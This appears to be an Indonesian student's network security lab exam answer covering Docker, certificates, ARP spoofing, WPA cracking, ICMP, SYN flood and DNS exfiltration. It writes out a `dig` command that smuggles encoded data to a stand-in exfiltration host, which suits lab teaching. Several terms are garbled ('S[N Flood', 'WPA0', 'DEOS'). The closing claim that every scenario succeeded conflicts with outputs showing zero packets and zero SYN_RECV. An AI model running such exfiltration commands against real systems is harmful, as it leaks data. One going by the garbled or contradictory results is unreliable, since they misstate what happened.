# JAWABAN UTS Praktik Network Security

**NIM:** 24552011266
**Kasus:** 4

## Perhitungan Kasus
- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 2, 6, 6
- Jumlah digit: 34
- Sisa bagi 10: 4
- Kasus yang diterima: 4

---

## Tugas 1 (Pertemuan 1): Docker & Volume
### Bukti:
```text
$ docker run --rm -v vol-k4:/data alpine cat /data/laporan-k4.txt
24552011266
```
```text
$ docker-compose -p k4 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy, 
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional 
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using Nginx.</em></p>
</body>
</html>
```
### Penjelasan:
Docker Volume (`vol-k4`) dikelola secara terpisah oleh Docker daemon di direktori penyimpanan host (`/var/lib/docker/volumes/`), terlepas dari siklus hidup container. Oleh karena itu, meskipun container penulis (`w-k4`) telah dihapus (`docker rm w-k4`), data file `/data/laporan-k4.txt` yang berisi `24552011266` tetap tersimpan secara persisten dan dapat diakses kembali oleh container baru yang me-mount volume yang sama.

---

## Tugas 2 (Pertemuan 2): Kriptografi
### Bukti SHA-256:
```text
5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494  laporan-k4.txt
5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494  hasil-k4.txt
```
### Sertifikat:
```text
subject=CN=k4.uts.local
issuer=CN=k4.uts.local
notBefore=Nov 17 08:23:07 2026 GMT
notAfter=Dec 17 08:23:07 2026 GMT
```
### Penjelasan:
- **Self-Signed Certificate:** Sertifikat ditandatangani sendiri oleh entitas pembuatnya (nilai `Subject` dan `Issuer` identik, yaitu `CN=k4.uts.local`). Cocok untuk pengujian internal/lab karena tidak memerlukan pihak ketiga, tetapi tidak dipercaya secara default oleh browser/sistem publik.
-  **CA-Signed Certificate:** Sertifikat ditandatangani oleh *Certificate Authority* (CA) tepercaya pihak ketiga. Browser dan sistem operasi memiliki daftar *root certificate* CA resmi sehingga dapat memverifikasi keaslian identitas server secara otomatis tanpa peringatan keamanan.

---

## Tugas 3 (Pertemuan 3): ARP Spoofing
### MAC Address Sebelum Spoofing:
```text
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.3       0x1         0x2         66:91:c1:21:ae:15     *        eth0
```
### MAC Address Saat Spoofing:
```text
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.3       0x1         0x2         56:17:74:93:c0:57     *        eth0
172.18.0.4       0x1         0x2         56:17:74:93:c0:57     *        eth0
```
### MAC Address Setelah Mitigasi:
```text
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.3       0x1         0x2         66:91:c1:21:ae:15     *        eth0
172.18.0.4       0x1         0x2         56:17:74:93:c0:57     *        eth0
```
### Mitigasi:
ARP bersifat *stateless* dan tidak memiliki mekanisme autentikasi sehingga host langsung memperbarui tabel ARP-nya saat menerima paket *ARP Reply* palsu dari penyerang (`172.18.0.4` / `56:17:74:93:c0:57`). Dengan menghentikan spoofing dan menerapkan *static ARP binding* (pemetaan IP gateway `172.18.0.3` secara permanen ke MAC asli `66:91:c1:21:ae:15`), kernel mengabaikan pembaruan ARP dinamis yang tidak sah sehingga jalur komunikasi kembali normal ke gateway asli.

---

**Mitigasi selain static ARP:** Mengaktifkan **Dynamic ARP Inspection (DAI)** yang dikombinasikan dengan **DHCP Snooping** pada switch terkelola (managed switch) untuk memvalidasi paket ARP terhadap tabel binding IP-to-MAC yang sah.

---

## Tugas 4 (Pertemuan 4): WPA0 Cracking
### Hasil aircrack-ng:
```text
Opening /work/handshake-k4.cap
Read 0 packets.

No networks found, exiting.

Quitting aircrack-ng...
```
### Penjelasan 4-way Handshake:
1. **Message 1 (AP -> Client):** Access Point mengirimkan nilai acak **ANonce** (*Authenticator Nonce*) kepada Client untuk mulai menurunkan kunci sesi (*Pairwise Transient Key* / PTK).
2. **Message 2 (Client -> AP):** Client menghasilkan **SNonce** (*Supplicant Nonce**), menghitung PTK dari PMK + ANonce + SNonce + MAC kedua perangkat, lalu mengirimkan SNonce beserta **MIC** (*Message Integrity Code*) ke AP.
3. **Message 3 (AP -> Client):** AP memverifikasi MIC dari Client, lalu mengirimkan **GTK** (*Group Temporal Key* untuk trafik broadcast/multicast) beserta MIC miliknya.
4. **Message 4 (Client -> AP):** Client mengirimkan pesan **ACK** sebagai konfirmasi bahwa seluruh kunci enkripsi telah terpasang dan komunikasi terenkripsi siap dimulai.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy
### Output kirim_icmp.py:
```text
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```
### Penjelasan SMURF Attack: 
*Smurf Attack* adalah serangan *Distributed Denial of Service* (DEOS) pada lapisan jaringan di mana penyerang mengirimkan paket **ICMP Echo Request** (Type 8) dalam jumlah besar ke alamat **IP Broadcast** jaringan dengan memalsukan (*spoofing*) alamat IP sumber menjadi alamat IP korban. Akibatnya, seluruh perangkat aktif di jaringan tersebut secara serentak membalas dengan paket **ICMP Echo Reply** (Type 0) ke alamat IP korban, sehingga membanjiri bandwidth dan melumpuhkan layanan korban.

---

## Tugas 6 (Pertemuan 6): S[N Flood
### SYN_RECV Sebelum Attack:
```text
0
```
### S[N_RECV Saat Attack:
```text
0
```
### Three-way Handshake (tcpdump):
```text
08:30:17.570571 IP 172.19.0.3.54682 > 172.19.0.2.80: Flags [S], seq 406828957, win 64240, options [mss 1460,sackOK,TS val 1918619270 ecr 0,nop,wscale 8], length 0
08:30:17.570608 IP 172.19.0.2.80 > 172.19.0.3.54682: Flags [S.], seq 707142874, ack 406828958, win 65160, options [mss 1460,sackOK,TS val 4076114214 ecr 1918619270,nop,wscale 8], length 0
08:30:17.570935 IP 172.19.0.3.54682 > 172.19.0.2.80: Flags [.], ack 1, win 251, options [nop,nop,TS val 1918619270 ecr 4076114214], length 0
```
### Mitigasi:
Mitigasi utama serangan SYN Flood adalah mengaktifkan **SYN Cookies** (`net.ipv4.tcp_syncookies=1`), di mana server tidak langsung mengalokasikan memori antrean koneksi saat menerima paket `SYN`, melainkan menyandikan parameter koneksi ke dalam *Initial Sequence Number* (ISN) pada paket `SYN-ACK` dan baru membuat entri koneksi setelah menerima balasan `ACK` yang valid dari klien. Selain itu, dapat diterapkan *rate limiting* paket SYN menggunakan firewall (`iptables`/`nftables`).

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration
### NIM dalam hex:
```text
3234353532303131323636
```
### Log DNS Query:
```text
$ docker-compose -p k4 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131323636.k4.exfil.lab @dns
10.0.0.99

$ python3 kasus/k9-dns-detect/analisis_dns.py dns-k4.log
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
```
### Decode Pesan:
```text
$ echo 3234353532303131323636 | xxd -r -p
24552011266
```

---

### Analisis Deteksi:
Teknik DNS exfiltration sulit diblokir oleh firewall tradisional karena protokol DNS (UDP/TCP port 53) umumnya selalu diizinkan keluar jaringan demi kelancaran resolusi nama domain normal. **Indikator deteksinya:** kemunculan subdomain dengan string hexadecimal yang panjang serta lonjakan frekuensi query ke satu domain induk yang tidak lazim.

---

## Kesimpulan
Saya telah menyelesaikan semua 7 tugas Kasus 4 (NIM 24552011266) dengan output dan penjelasan yang diminta, serta telah membersihkan seluruh resource Docker setelah praktikum selesai.
**Total waktu:** 01:15
**Catatan:** Semua skenario berhasil dijalankan di VM Kali Linux dan seluruh container sudah dibersihkan.